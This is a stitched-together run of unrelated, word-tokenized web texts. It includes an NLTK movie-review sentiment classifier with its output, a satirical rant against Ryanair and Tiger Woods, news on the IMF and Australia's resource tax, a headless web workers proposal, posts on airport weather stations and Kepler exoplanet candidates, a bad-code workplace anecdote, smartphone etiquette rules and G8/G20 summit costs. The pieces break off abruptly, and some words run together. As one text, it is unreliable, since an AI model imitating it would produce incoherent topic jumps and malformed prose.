import nltk.classify.util from nltk.classify import NaiveBayesClassifier from nltk.corpus import movie_reviews def word_feats ( words ) : return dict ( [ ( word , True ) for word in words ] ) negids = movie_reviews.fileids ( ' neg ' ) posids = movie_reviews.fileids ( ' pos ' ) negfeats = [ ( word_feats(movie_reviews.words ( fileids=[f ] ) ) , ' neg ' ) for f in negids ] posfeats = [ ( word_feats(movie_reviews.words ( fileids=[f ] ) ) , ' pos ' ) for f in posids ] negcutoff = len( negfeats ) * 3/4 poscutoff = len( posfeats ) * 3/4 trainfeats = negfeats [ : negcutoff ] + posfeats [ : poscutoff ] testfeats = negfeats [ negcutoff : ] + posfeats [ poscutoff : ] print ' train on %d instances , test on %d instances ' % ( len( trainfeats ) , len( testfeats ) ) classifier = NaiveBayesClassifier.train( trainfeats ) print ' accuracy : ' , nltk.classify.util.accuracy( classifier , testfeats ) classifier.show_most_informative_features ( )
And the output is :
train on 1500 instances , test on 500 instances accuracy : 0.728 Most Informative Features magnificent =
True pos : neg = 15.0 : 1.0 outstanding =
True pos : neg = 13.6 : 1.0 insulting =
True neg : pos = 13.0 : 1.0 vulnerable =
True pos : neg = 12.3 : 1.0 ludicrous =
True neg : pos = 11.8 : 1.0 avoids =
True pos : neg = 11.7 : 1.0 uninvolving =
True neg : pos = 11.7 : 1.0 astounding =
True pos : neg = 10.3 : 1.0 fascination =
True pos : neg = 10.3 : 1.0 idiotic =
True neg : pos = 9.8 : 1.0
As you can see , the 10 most informative features are , for the most part , highly descriptive adjectives .
The only 2 words that seem a bit odd are “ vulnerable ” and “ avoids ” .
Perhaps these words refer to important plot points or character development that signify a good movie .
Whatever the case , with simple assumptions and very little code we ’re able to get almost 73 % accuracy .
This is somewhat near human accuracy , as apparently people agree on sentiment only around 80 % of the time .
Future articles in this series will cover precision & recall metrics , alternative classifiers , and techniques for improving accuracy .
It is done .
Ryanair , the " no frills " bucket shop airline , has finally confirmed that passengers will now be charged to use the loo .
Thus a new low in international travel is , quite literally , plumbed .
This idea was mooted last year , then retracted after a national outcry , but I suppose the executives could n't bear to let it go .
Free money !
It sat there like a drunk man 's wallet on a crowded beach , too irresistible to go unplucked .
You can see their thinking .
Once you 've charged people an extra tax for buying their ticket on a credit card , they 'll try to maximise the value with a longer holiday .
That spells more luggage .
Once you charge them for every piece they check in , that guarantees their attempt to drag more hand luggage on to the plane .
Once you charge them an additional price for checking in online , that means more of them will stand in an endless queue at the airport .
Once you 've got people queuing for hours , clutching heavier pieces of hand luggage , exhausted and hot by the time they board , those people are going to need a drink .
Once you charge them a fat fee for having a drink ( for example , £ 2.10 for a cardboard beaker of water with a teabag in it ) , those people are going to feel obliged to drain every drop .
And once they have drained every drop , all you need is a coin slot on the locked loo door and it's HELLO MONEY .
It may be goodbye respect , kindness , hospitality , tact and class , but who cares about that when a chunky pound coin is dropping into the slot with every desperate bladder ?
There is a risk that sympathetic cabin crew will unlock the door for free .
But do n't worry !
Once you have charged the cabin crew for their own training , charged them again for their uniforms , then underpaid them for the job itself , they 'll be so miserable and demoralised that any milk of human kindness will have drained right through the floor .
( Milk drainage : £ 5 ) .
I mean , this is brilliant .
I take my hat off to Ryanair .
( What will that cost me ?
I can only assume there is a hat tax . )
While they are rejigging costs , I have a few more ideas to be considered .
Why not drizzle warm , bottled saliva on to every passenger from above and charge them for umbrellas ?
You could dispense with heating on board – let the craft chill right down to " fatal " – and charge people for blankets .
Or smack passengers in the face with a mallet as they sit down , squirt mustard gas in their eyes , spike the drinks with arsenic , pepper the arm rest with razor blades and charge £ 100 for access to the first aid box .
God , I hate Ryanair .
I did n't think I could despise them more than I already did , with their tacky , greedy , soulless product that makes people feel like mistreated cattle in a cut - price abattoir , but then I read last week 's statement from their representative , Stephen McNamara : " By charging for the toilets we are hoping to change people 's behaviour so that they use the bathroom before or after the flight . "
Just read that back and tell me you do n't find it chilling .
If not , read it again , this time imagining that Stephen McNamara has control over everything in the world , not just aeroplane policy .
" Change people 's behaviour " ?
Why not rename the company ClockwAirk Orange ?
I think it 's time for the government to take control of the air industry .
Introduce a minimum charge of £ 300 for any flight , then renationalise British Airways .
That would kill off the cut - price hell - firms and boost BA , which might then be able to pay its staff enough to end the strike problem while making some money to be fed back into our £ 1 trillion budget deficit .
True , it might punish those who can't afford £ 300 for their holiday flight and are prepared to suffer the Rya - nightm - air accordingly , but ( leaving aside the fact that the hidden costs might screw them anyway ) sometimes people need to be saved from themselves .
Plenty of folk were prepared to work for less than the minimum wage , but we agreed it was uncivilised to let them .
Same here .
In the meantime , if you 're flying Ryanair this summer , why not get up halfway through the journey , pull your trousers down and wee in the aisle ?
Right there on the floor .
These airlines target passengers who want or need to save money ; surely , they could only encourage this whole new way to economise .
Easy , Tiger
I 'm worried about Tiger Woods , back on the golfing trail in Augusta .
It ca n't be healthy to leave sex rehab and go immediately to a place where all the talk is of strokes and holes .
We are dealing with an ill man here .
I am not saying Tiger is ill .
He is saying it .
Having this " disease " is the grounds on which he expects his wife to sympathise , forgive and return .
If he 's that unwell , heaven knows what he 'll do when asked if he'd like his balls washed before shooting up the back nine .
To you and me , these words are harmless .
But you must imagine what could happen , in the addled mind of an ailing sex patient , if a helpful caddy offers to help with any loose impediments , provide a regular shaft or polish his flange .
Please do n't snigger .
Sex addiction is a genuine and challenging disease , it 's not just a risible modern excuse for a randy billionaire who can't keep his pants on .
Diagnosed with the illness , Woods did the only sensible thing : locked himself away , immediately , in a remote house full of nymphomaniacs .
Even returning to practice sessions could be dangerous for the poorly fellow .
Heaven forbid a caddy should offer to point out the sweet spot while Tiger is waggling .
The key question from now on will be : is it the caddy 's job to retrieve balls from the practice area or will Tiger do his own shagging ?

The International Monetary Fund has given its support to the Federal Government 's planned resource super profits tax .
The deputy head of tax policy at the IMF Philip Daniel has told a tax conference in Sydney this morning the proposal is a worthwhile reform .
He says there are a number of benefits in the RSPT which could also be adopted in other countries .
" IMF staff welcome the RSPT proposal in principle .
It shifts the whole Australian resource tax system strongly in the direction of neutrality , " he said .
" It offers strengthening of Australian public finances over the long term , reduces risk of absolute loss for investors , while leaving a substantial share of resource profits in private hands . "
The IMF also says there is no indication that the Federal Government 's proposed RSPT would hurt Australia 's economic prospects .
Mr Daniel says the argument that the tax would hurt Australia 's competitiveness is overstated .
" The tax proposal does n't show adverse effects on Australia 's economic prospects either , " he added .
" Consensus forecasts offer evidence that the outlook for business investment has in fact strengthened for Australia in recent months . "
He says not enough focus has been given to the benefits the mining industry should gain through the Government 's assumption of some of the project risk .
" The argument on tax competitiveness too tends to ignore the fact that the new proposals incorporate large risk bearing by Government - to the extent of 40 per cent of losses and more in the case of exploration , " he explained .
" Few other jurisdictions seeking petroleum and mining investment are able to offer that . "
However , a resources economist says the super profits tax proposal may not raise as much money as the Federal Government predicts .
Ben Smith is a visiting fellow at the Australian National University and says the retrospective application of existing projects would guarantee solid revenues , but only in the short - term .
" In the long run , the Government is going to earn 40 per cent on the average rate of return of mining and in the long run that 's not guaranteed to be particularly high , " he said .
" It could even be negative - that 's unlikely but , you know , there are risks associated with it and the Government really needs to spend the revenue taking account of those long run factors . "
However , he also says the mining industry 's campaign has been misleading and potentially damaging .
" To tell people that the consequence of this tax is that all mining industry profits will be taxed at the rate of 56.8 per cent and that this is the highest tax rate in the world - which is a gross distortion of the actual consequences of the tax - is likely to make people think twice about whether they want to invest in mining in Australia , until they see that this is a gross distortion , " he added .
Headless Web Workers :
Does the web need background apps ?
At my last job , I created several web applications designed to replace built - in apps on mobile phones .
While modern browsers and HTML5 made this incredibly easy in many ways , we still ended up writing native ( i.e. non -web ) code for most of our applications .
There were a few different areas where the browser alone did n't meet our needs , but one that I found suprisingly common was background processing .
Consider the following mobile applications :
Calendar or clock with alarms .
E - book reader that syncs content from a server .
IM or email client that notifies the user of new messages .
Shopping list that pops up whenever you are near the store .
Ideally , each of these apps will perform some actions even when the user does not have it open .
( Background processing is not strictly necessary for the e-reader , but it would be useful to ensure the library is up - to - date even when opened in a place with no network connection . )
You can't do this with a web app .
Web Workers do n't solve the problem , because they run only while the web page is open .
What we need are headless web workers .
1
Update ( 2010 - 04 - 26 ) : Gordon Anderson points out in comments that members of Google 's Chromium / Chrome OS projects have made a very similar proposal they call Persistent SharedWorkers .
The API
Headless workers could use almost the same API as Web Workers .
Instead of responding to messages from a web page , they would listen to events from the host system ( browser or OS ) .
These events might include time intervals , power - on / resume , changes in network connection , geographic locations , or " push " notifications from a remote server .
The event - driven architecture of JavaScript in the browser allows the host system a high level of discretion over resource consumption .
There 's no special code needed to suspend processes and later restore their state , because JavaScript workers are naturally inactive between events .
The host can provide limits on CPU or memory usage per event , with a separate message to notify processes whose handlers were aborted .
And it can limit the number of concurrent processes by choosing when to dispatch events to listeners .
Some listeners could even be disabled completely at times ( like if the device is busy or the battery is low ) , and notified later of the events they missed .
This is almost a return to the old days of cooperative multitasking .
Mobile computing is definitely driving everyone towards higher - level process control in the OS , and different assumptions for applications .
It 's not surprising that my whole proposal resembles Android and iPhone 4.0 multitasking in several ways , since I 've been doing development on Android for the last 18 months and encountering many of the same issues .
The UI
Headless workers do need some way to interact with the user .
They could display standard system notifications ( via Growl on the Mac , libnotify on Ubuntu , the status bar in Android , etc. ) using W3C Web Notifications , which already have an experimental implementation in Chrome .
Users also needs to know which sites have background tasks installed .
Headless workers could be represented by icons in a standard location ( perhaps a toolbar in desktop browsers , or the home screen on a mobile device ) .
The icons could display ambient status ; clicking one would reveal a menu with options to configure or remove it .
Questions
This proposal might be hard to standardize , especially where it 's tied to specific OS capabilities .
For now I 'm just curious : would it be useful ?
You can write a native app or a browser extension to solve this problem today .
But would it be worthwhile to have a standard , cross - platform way to do it ?
Has anyone else run into problems that this approach could solve ?
This is a look at the print publishing business model .
It is a simplified description , but understand the big picture is more important than the details .
Revenue
Historically print publishers earned revenue from copy sales and advertising .
Some publishers , mainly in the trade press , rely solely on advertising .
Others , such as book publishers , rely solely on copy sales .
Most newspapers and magazines make money from a mix of the two .
Historically newspapers published in the UK would make almost all their monty from copy sales .
In the rest of the world advertising is more important .
The balance between advertising and copy sales revenue usually determines a title ’s editorial strategy .
One important part of this is that when the money comes mainly from readers , then serving their interests is unquestionable .
When money mainly comes from advertisers there is always a temptation to pander to their needs over reader needs .
The revenue part of a publication ’s business model is simple :
Revenue = copy sales + advertising sales
Publishers who rely mainly on copy sales for their income typically spend more on producing quality editorial to attract readers .
Advertising - focused publishers put less emphasis on editorial .
In extreme cases , they do away with editorial all together producing publications which closely resemble catalogues .

I ’ve mentioned problems with airports as climate stations in the past , mostly that they are pockets of UHI that have grown with the 20th century aviation boom .
A good example is Chicago O’Hare airport .
I ’ll bet that many of you do n’t know that the ICAO ID for O’Hare , is KORD , and FAA uses ORD which is what you see on airline luggage destination tags .
“ ORD ” has nothing to do with the name O’Hare , which came after the airport was established .
It has everything to do with the name “ Orchard Field ” which is what the airport started out as , which at the time was far more rural than it was now .
You can read about its early history here .
Here is what it looked like in the 1940’s :
Here ’s that same view today from Google Earth :
Look at O’Hare today , a sprawling megaplex of concrete and terminals surrounded by urbanization :
The weather station location above is designated by the orange pushpin .
Here ’s a closeup view :
Note that there ’s two electronics equipment buildings nearby with industrial sized a / c exhaust vents .
While not USHCN , NCDC metadata lists O’Hare as a Class “ A ” station , which means it does in fact record climate .
Data from O’Hare can be used to adjust other stations with missing nearby data .
The point I ’m making with all the photos is that airports are far from static , especially since airline deregulation in the 1980’s .
The are just as dynamic as the cities they serve .
We measure climate at a great many airports worldwide .
E.M. Smith reports that the majority of the GHCN record is from airports .
Even NOAA meteorologists admit that airports are n’t necessarily the best place to measure climate .
In a series of stories I did …
How not to measure temperature , part 88 – Honolulu ’s Official Temperature ±2
.. about the failure of the aviation weather station at Honolulu causing unparalleled record highs , the NOAA Meteorologist there had this to say :
“ ASOS … placed for aviation purposes … not necessarily for climate purposes . ”
The key issue here is “ aviation purpose , not climate purposes ” .
The primary mission is to serve the airport .
Climate is a secondary or even tertiary consideration .
And that ’s exactly what happened in the story from the Baltimore Sun below .
The observer used FAA guidelines rather than NOAA guidelines to measure snow for the climate record .
NOAA does n’t like the record because he did n’t follow their procedures , so they toss it out .
However , when a new high temp record is set in Honolulu due to faulty equipment , NOAA thinks THAT ’s alright to keep in the records :
NOAA : FUBAR high temp / climate records from faulty sensor to remain in place at Honolulu
A nearby station shows the error :
This is your Honolulu Temperature .
This is your Honolulu Temperature on ASOS .
Any questions ?
So it is with some disgust that I provide an excerpt of this article on NOAA rejecting a record snowfall at the BWI airport , where they set up a snow measuring board , but did n’t follow through on procedure .
Again , the airport was doing measurements to serve the airport interests , not NOAA .

… A contractor working for the Federal Aviation Administration at BWI Thurgood Marshall Airport , paid to measure the snow for the aviation industry ’s needs , did not follow a separate protocol required by the National Weather Service and the National Climatic Data Center for valid climate data .
So while the contractor measured 28.8 inches of snow during that storm , the National Weather Service has thrown out the reading .
Instead , climatologists will rank the storm as “ only ” 24.8 inches – a number that almost surely understates the “ true ” total .
Worse , for climatologists , it now appears the weather service ’s rules for snow data had been ignored for years at BWI , throwing a cloud over the validity of snow totals as far back as 1998 , when the FAA took the job over from the weather service .
Only BWI ’s data are known to be affected , but the problem could be more widespread .
That possibility has caught the attention of top officials at the FAA .
“ We plan to meet with the National Weather Service next week to begin a discussion on making sure that we ’re all on the same page in terms of measuring snow accumulations at our airports , ” FAA spokesman Jim Peters said .
“ There will be a national discussion . ”
In the meantime , the weather service ’s Baltimore - Washington Forecast Office in Sterling , Va. , is preparing to convene a committee of climatologists and other experts to review Baltimore ’s snowfall records from the 2010 and 2003 storms , and perhaps back to 1998 .
“ I feel very strongly about historical records and getting the climate data correct , ” said James E. Lee , the meteorologist - in - charge at Sterling .
“ Obviously , with the increased media attention and political attention to climate , it is really up to NOAA [ the National Oceanic and Atmospheric Administration , of which the National Weather Service is an agency ] to make sure … the climate record is a genuine one , and consistent to the best of our ability . ”
The problem at BWI came to light Feb. 6 , as snow accumulations reported at the airport passed 26 inches .
They seemed poised to break the record set in February 2003 – the storm listed on Sterling ’s Web site as Baltimore ’s biggest .
But when reporters called asking about a new record , Lee said that because of measurement errors by an FAA contractor at BWI , the two - day storm total would be pegged at “ only ” 24.8 inches .
He had discarded a 28.8 - inch measurement from BWI because it was the sum of hourly measurements throughout the storm – a method invalid for climatological data .
Even at 24.8 inches , Lee said , the storm total beat the previous two - day record of 24.4 inches , set at BWI during two days of the four - day 2003 event .
“ I ’m convinced that was the most amount of snow Baltimore has seen [ from a two - day storm ] in recorded history . ”
But Lee had to use the most conservative reading from the airport – a “ snow depth ” measurement of the total on the ground when the storm ended , after hours of compaction .
The FAA requires its observers to take hourly snow measurements and wipe the boards clean after each hour , adding the totals as they go .
That provides pilots with better real - time information about changing conditions .
But it virtually eliminates compaction and so inflates accumulation .
Climatologists require measurements every six hours , striking a balance between the hourly and snow depth readings .
Some airports maintain separate snow boards for the different protocols .
But not BWI .
Richard Carlson , vice president of Pacific Weather Inc. , said his company has experienced weather observers at 20 U.S. airports , including eight at BWI .
Pacific has held the contract there since 2008 .
“ We follow the FAA manual … and that is the guide book on how these meteorological observations are to be taken , ” Carlson said .
“ We had heard about the six - hour measuring thing , but … if you have high winds at all , this really is not going to work . ” …

NASA 's Kepler spacecraft hunting for Earth - like planets aroundother stars has found 706 candidates for potential alien worlds while gazing atmore than 156,000 stars packed into a single patch of the sky .
If all 706 of these objects pass the stringent follow - up teststo determine if they are actually planets , and not false alarms , they could nearlytriple the current number of known extrasolar planets .
They were announced aspart of a huge release of data from the mission 's first 43 days by NASA 's Kepler science team this week .
The Keplerspace observatory monitors stars for subtle changes in their brightness , which could indicate the presence of alien planets passing in front of them asseen from Earth .
Astronomers will use the newly - released data from Kepler todetermine if orbiting planets are responsible for the variation in brightnessof several hundred stars .
? " This is the most precise , nearly continuous , longestand largest data set of stellar photometry ever , " said David Koch , themission 's deputy principal investigator at NASA 's Ames Research Center inMoffett Field , Calif. , in a statement .
" The results will only get betteras the duration of the data set grows with time . "
By measuring tiny decreases in the brightness of stars whenplanets cross ?
or transit ?
in front of them , astronomers can determine thesize of the planet .
[ Thestrangest alien planets . ]
To date , astronomers have discovered more than 400 alienplanets lurking around stars beyond our solar system .
That includes sixnewfound worlds discovered by a French observatory that were announced earlierthis week .
Zoo of parent stars
Kepler currently monitors a star field in the constellations Cygnus and Lyra .
The stars make up a full range of temperatures , sizes andages .
Many of them are stable , but others pulsate .
Some of the stars show starspots , which are similar to sunspots , and a few even produce flares that are sopowerful they would sterilize their nearest planets , should any exist .
In this particular star field , Kepler has identified 706 planetary candidates , of which the data for 306 of these were part of thepublic data release this week .
The 28 members of the Kepler science team are usingground - based telescopes , the Hubble Space Telescope and the Spitzer SpaceTelescope to perform follow - up observations on a specific set of 400 objects thatwere not publicly released to double - check if they are good candidates foralien planets .
Data from these follow - up observations will determine whichof the objects of interest can be identified as planets .
These findings willsubsequently be released to the scientific community in February 2011 .
Double - checking potential planets
Follow - up observations are necessary in order to distinguishcandidates that are actual planets from false alarms , such as binarystars , which are two stars that orbit each other .
" For the most interesting objects , we go through aprocess of putting the data through a series of sieves , " Charles Sobeck , Kepler 'sdeputy project manager , told SPACE.com .
" For final candidates that havepassed all the tests , we then go to the expensive resources like Hubble and Spitzer . "
The size of planetary candidates can also only beapproximated until the size of the stars they orbit is determined fromadditional spectroscopic observations made by ground - based telescopes .
" I look forward to the scientific community analyzing the data and announcing new exoplanet results in the coming months , " saidLia LaPiana , Kepler 's program executive at NASA Headquarters in Washington , D.C. , in a statement .
Search goes on
The Kepler observatory will continue conducting scienceoperations until at least November 2012 .
It will also continue searching for Earth - likeplanets , including those that orbit stars in a warm , habitable zone whereliquid water could exist on the surface of alien planets . ?
And , since transits of planets within this habitable zone ofsolar - like stars occur about once a year and require three transits forverification , it is expected to take at least three years to locate and verifyany potential Earth - size planet .
" The Kepler observations will tell us whether there aremany stars with planetsthat could harbor life , or whether we might be alone in our galaxy , " said Kepler 's science principal investigator William Borucki of NASA 's AmesResearch Center .
So far , Kepler 's observations have produced a wealth ofinformation , and it has surpassed the expectations of its mission scientists , Borucki said .
" We never thought we'd have this much this early , it ' sabsolutely wonderful , " Borucki told SPACE.com .
" The instruments areworking well , but we still have some work to do .
We 're certainly not finishedwith this kind of work , and each year , we go to more and more difficult targets .
So , people have to be patient . "
Greg bought the promises of the startup .
They wanted him to step in and take a mentoring role on a cutting edge , object oriented , SaaS project that was promised to be " a game changer " .
There would be stock options , a friendly workplace , and a savvy CEO that was deeply involved in the design process .
Despite the buzzword - bingo , it sounded promising , and the interviews went well .
The small office was laid out like a Starbucks , complete with eye - strain inducing dim lighting .
The core developers sat around a long table , clacking away at their laptops and cracking in - jokes over coffee .
It was very chummy , and Greg was n't part of the crowd yet ; they 'd need to sniff each other 's posteriors and decide who was the alpha in this pack .
That could come later ; during his first week , Greg just wanted to get into the code and start learning the software .
He pulled the latest build off the server and fired it up .
And waited .
And went for coffee .
And waited .
Finally , the splash page appeared , vanished , and he continued waiting for the next screen .
" Any reason why this is so slow ? "
Greg asked , wondering if he had missed a setup step or misconfigured something .
" It 's the CEO 's design , " the other developers chorused .
Greg was n't sure how to take that , so he started poking around in the code .
It was a bad sign when he saw a variable named MyString1 , but even more ominous was the comment above it : // Refactored to comply with standards - JM/10 - 8-09 .
His stomach hit an iceberg and started taking on water as he investigated further , seeing Public void MyProcess37 .
The database was n't any better : Database1 had Table1 which held Column1 through Column100 .
There were tens of databases and tens of tables in each .
A hand clamped down on his shoulder and gave a disturbing squeeze .
" Settling in ? " the CEO boomed .
" Listen , let me take you out to lunch today so we can do some Q&A , and make sure we 're all on the same page . "
Greg definitely had questions .
He started with the administrative : paychecks and stock options .
He learned that the stock options would n't happen for another five years .
Perhaps cranky due to that news , or over the chintzy buffet his CEO considered a good place for lunch , Greg pressed his boss on naming conventions .
" It 's very important to me that we have a generic , object oriented approach , " the CEO explained .
Greg countered that was exactly what they did n't have .
He explained , in broad strokes , how C# did object oriented design , what " generic " meant to a developer , and the importance of good naming conventions that clearly described what the code and fields were actually for .
" Well , you need to understand , " the CEO explained , his voice picking up a nearly religious tone of gravitas .
" My system , the one I designed should be able to handle any mapping structure that I can imagine .
If Company1 wants to store an amount of $ 3,000,000 on column12 of table 54 in database3 , that should n't stop Company 2 from storing that employee75 has a gender of male in that same column .
And all of that data can be searched by the XML engine that you will be building .
Like I explained during the interview , I 'm counting on you to head that up and make sure the team really understands our vision . "
" And why would you say that you 're leaving ? " the company 's sole HR person asked during Greg 's exit interview .
" Let 's just say I have a vision problem that keeps me from working here , " Greg said .
As ash from Iceland 's Eyjafjallajokull volcano continued to keep European airspace shut down over the weekend , affecting millions of travelers around the world , some government agencies and airlines clashed over the flight bans .
Some restricted airspace is now beginning to open up and some limited flights are being allowed now as airlines are pushing for the ability to judge safety conditions for themselves .
The volcano continues to rumble and hurl ash skyward , if at a slightly diminished rate now , as the dispersing ash plume has dropped closer to the ground , and the World Health Organization has issued a health warning to Europeans with respiratory conditions .
Collected here are some images from Iceland over the past few days .

David Bernstein observes that if Elena Kagan is confirmed then every single Supreme Court Justice will have attended Harvard or Yale law schools .
He also observes that :
The president went to Harvard , and barely defeated a primary opponent who went to Yale .
His predecessor went to Yale and Harvard , and defeated opponents who went to Yale and Harvard , and Harvard , respectively .
The previous two presidents also went to Yale , with Bush I defeating another Harvard grad for the presidency .
.. and asks , “ Is n’t this a bit much ? ”
His post reminded me of something that Peter Drucker wrote , way back in 1968 :
One thing ( a modern society ) therefore cannot afford in education is the “ elite institution ” which has a monopoly on social standing , on prestige , and on the command positions in society and economy .
Oxford and Cambridge are important reasons for the English brain drain .
A main reason for the the technology gap is the Grande Ecole such as the Ecole Polytechnique or the Ecole Normale … By contrast , one of the strengths of American education is the resistance to any elite monopoly .
To be sure , we have institutions that enjoy ( deservedly or not ) high standing and prestige .
But we do not , fortunately , discriminate against the men who receive their training elsewhere .
The engineer whose degree is from North Idaho A and M does not regard himself as “ inferior ” or as “ not really an engineer . ” ….
And five or ten years later , nobody cares much about where the fellow got his degree …
The Harvard Law School might like to be a Grande Ecole and to claim for its graduates a preferential position .
But American society has never been willing to accept this claim .
… It is almost impossible to explain to a European that the strength of American higher education lies in this absence of schools for leaders and schools for followers .

I spent way too much time assembling Hanna and Jackie ’s lines in the first panel .
A term I ’ve heard recently and find relevant is “ accelerationist pop ” : SOPHIE , PC Music , Chari XCX , Hannah Diamond , et al… music with a grotesque infantile nature that , in its imitation of a capitalist reality , attempts to look beyond one .
Not quite the same as covering pop hits from the 90s , but grappling with the same amused horror at our depleted past and a horizonless future .
Eve and Will are a little bit of hope in the fog , finding each other if nothing else .
I wrote recently that the new features in Apple ’s iPhone 4 have me wondering if I should finally get a smartphone .
But for me , the technical aspects of the iPhone are actually the least important part of a decision like this .
The iPhone has fundamentally changed the way people communicate and interact .
And the changes are n’t always positive .
I ’ve been thinking a lot about what it would mean to bring an iPhone into the house .
Here ’s the situation .
I ’m not an IT guy , but I am a technophile .
I like cool technology , and I love well - designed products .
But in our house , all computer activity stops at 8:30 PM .
Without that rule , we talk less and sleep worse .
What would happen if we brought smartphones into the house ?
I ’m not sure , but I feel my blood pressure rise when I read about people ( including many TMO writers and readers ) using them to check news headlines in bed or fact - check conversations on the fly .
This behavior was n’t the original reason I stayed away from smartphones , but it ’s proven to be the most durable .
The thing is , as phones get more compelling , it gets harder to stay away .
Peer pressure is one reason for some ( take TMO reader Geoduck ’s comment as an example ) ; two others are money and convenience .
For many of us , it ’s now cheaper and easier to own one smartphone than to lug around a phone , camera , camcorder , and GPS .
These mobile devices will only become more a part of our lives .
So it ’s time for some discussion about their appropriate role .
People write about gadget etiquette all the time , including here at TMO .
But I feel we ’re at a transition point with iPhone 4 .
The sheen has worn off .
These devices are part of modern life .
The iPhone and it ’s competitors ( what David Pogue calls “ app phones ” ) are all grown up .
It ’s time for us to grow up , too .
Let ’s talk about what it means to be an adult with a smartphone .
Basic Principle # 1 : The Message You Send Sends a Message
Apple stresses that the iPhone connects people with one another .
That ’s true , if the people are n’t already physically proximate .
But what about the people standing next to you ?
You ’re ignoring the world around you with every email you read , every text you send , and every check of facebook or twitter or — indeed — The Mac Observer .
Let me repeat that : if you ’re communicating with someone who is n’t present , then you ’re not communicating with the people who are present .
The result is that the mere sight of a mobile device sends a message to the people around you .
If you who wear your phone on a hip holster or always wear a bluetooth earpiece , you tell everyone around you that you are fully prepared to stop paying attention to them at any time .
And when that text , email , or call does arrive , or when you glance down to check on that push notification , everyone around you gets the message that they ’re less important to you than the people at the other end of your phone .
This leads me to Rule # 1 .
Mobile devices should remain invisible .
Not necessarily hidden ( although that ’s fine ) , but invisible .
If you ’re using your phone in such a way that others notice it , then you ’re being rude .
How do you follow Rule # 1 ?
Minimize the visibility of your phone and peripherals .
Turn off audible alerts .
Never use your phone during a meeting or conversation .
You ’re not being sneaky , you ’re being an ass .
If you run a meeting , institute a no-phones policy .
If you do need to check your phone , excuse yourself from the meeting or conversation first .
( You do n’t need to say anything , just move away . )
Do n’t fact - check the conversation unless someone else specifically requests it .
If you ’re really itching to look something up , ask first : “ Should I Google it ? ”
If no one answers , the answer is no .
If you want to use your phone for something social ( to show pictures , to share music , to take a picture or video ) , ask first : “ Our new dog is really cute .
Want to see her ? ”
( Again , if no one answers , the answer is no ! )
Being on your own — walking down the street , say — does not exempt you from this Rule .
If you ’re playing with a phone , anything that goes wrong ( bumping into people , getting hit by a car , falling down a manhole ) is your fault .
Basic Principle # 2 : Focus is Binary
There are plenty of words being written about how always - on , multi- tasking behavior damages critical thinking .
More importantly , the concept multi-tasking is basically a lie .
Working on multiple tasks degrades our ability to do any of them well .
There ’s cognitive psychology research being done to quantify the effect .
But come on , we do n’t need doctors to tell us that we can only do one thing at a time .
Have you ever had a stimulating conversation with one person while you write a brilliant letter to someone else ?
Of course not .
The result is that constantly running to your phone does n’t just make you emotionally distant , it also makes you dull and unpleasant .
For example : Joe is with his friends Adam and Sarah when he receives a text from Jane , who has suggested a time and place to meet later that afternoon .
He looks up from his phone and says , “ That was Jane .
I ’ll have to leave after lunch . ”
Maybe Adam was hoping to get a ride from Joe after lunch , so this information is relevant to him .
But Adam was in the middle of talking to Sarah about something completely different , so Joe ’s comment is annoying and distracting .
It comes across more as if Joe is forcing Adam to make a decision immediately , on Joe ’s schedule , about whether he wants a ride .
Hence we require Rule # 2 .
Do one thing at a time .
There ’s a small door between the analog world around you and the digital world in your phone .
Respect that door , and do n’t try to be on both sides of it at once .
You ’ll be more likely to say something interesting in an analog conversation , and you ’ll be more likely to get something from your digital excursion .
Rule # 2 is somewhat Zen .
Some tips for putting it in practice :
Follow Rule # 1 .
In addition to making you more pleasant to be around , it raises the barrier to stepping between the digital and analog worlds .
Put the analog world first .
You are at your most effective in the analog world , because all your senses and faculties are fully at your disposal .
If you ’re going to do or say something worthwhile , you have your best chance of it happening with the people right in front of you .
If you ’re bored , do n’t start fiddling with your phone .
Instead , look for one thing to think about in depth .
You wo n’t be bored for long , and you also wo n’t be so boring .
When you return from the digital world , return quietly .
Pause to dump your brain ’s working memory .
Even if you learned or did something interesting on your digital adventure , no one else went with you .
You walked out on the conversation .
You are now obliged to re-integrate yourself into the conversation as much as if you had walked out of the room .
Basic Principle # 3 : Behavior and Expectations are in Positive Feedback
People express disbelief when I say we shut down our computers at 8:30 PM .
How would anyone get ahold of us if there ’s a problem ?
How do we get all of our work done ?
The disbelief comes from an expectation of how and when people are available .
Expectations about availability — on phone , email , social networks , or Twitter — are understood to drive our behavior .
But behavior also drives expectations .
How do we keep our rule ?
We simply plan to be done by 8:30 PM with anything that requires a computer .
Very occasionally we ’re overloaded and fail to meet the deadline , so our sleeping habits suffer accordingly .
But it ’s rarely a problem .
Much more common is that one of us “ has to do one quick thing ” — send an email , check a website — for something that no one will use before the following morning .
This behavior is fascinating to me .
Why do we feel like there might be “ something important ” that we do n’t want to miss ?
When you stop and think about it , even the important things usually do n’t have an immediate deadline .
You can answer an important email tomorrow morning .
In fact , you might be able to answer more constructively if you ’ve had a night ’s sleep .
Or if you wait to deal with it over a phone call or in person .
Hence , Rule # 3 . Reserve urgency .
Most of what we do is not that important .
Behave accordingly .
If you ’re not always in panic mode , people will take you seriously if pull out your phone to get something done .
( Remember Rule # 1 , and excuse yourself first . )
I ’ve found I do n’t need a bullet list to follow Rule # 3 .
I just need to lower my opinion of myself .
In fact , we ’d probably all benefit from occasionally reminding ourselves : “ The world will go on without me . ”
Believe that , and you ’ll feel a lot less pressure to check in on FourSquare .
Or update your FaceBook status .
Or respond to comments on your blog .
Feel the weight lifting from your shoulders ?
Great .
Now put down your phone , turn to the person next to you , and try out a conversation that ’s carried on by something other than your thumbs .
You ’ll thank me when your companion notices she has your undivided attention , and smiles .
Prime Minister Stephen Harper walks with local MP Tony Clement in Huntsville , Ont. in June , during a tour of the G8 summit site .
( ( Adrian Wyld / Canadian Press ) )
The cost of hosting the G8 and G20 summits next month in Ontario now stands at $ 1.1 billion and further outlays are likely , federal documents show .
The price tag includes $ 160 million for hospitality , infrastructure , food safety and extra staffing .
That amount is in addition to the $ 933 - million security bill the Tories revealed earlier this week .
Protesters confront police in London in April 2009 as thousands of demonstrators converged on the centre of the city to protest against the G20 summit .
( ( Owen Humphreys / Associated Press ) )
" This might be the most expensive 72 hours in Canadian history , " Liberal MP Mark Holland said .
But Public Safety Minister Vic
Toews defended the costs for security , saying Canada has an obligation to make sure world leaders are safe while visiting Toronto and Huntsville , Ont .
Liberal Leader Michael Ignatieff blamed the Conservative government 's " poor management " for the ballooning cost estimates .
Ignatieff said Wednesday that Canadians can't understand how the government 's initial earmarking of $ 179 million for security has multiplied in the space of a couple months .
Security costs at previous summits G8 summit Japan , October 2008 : $ 381 million
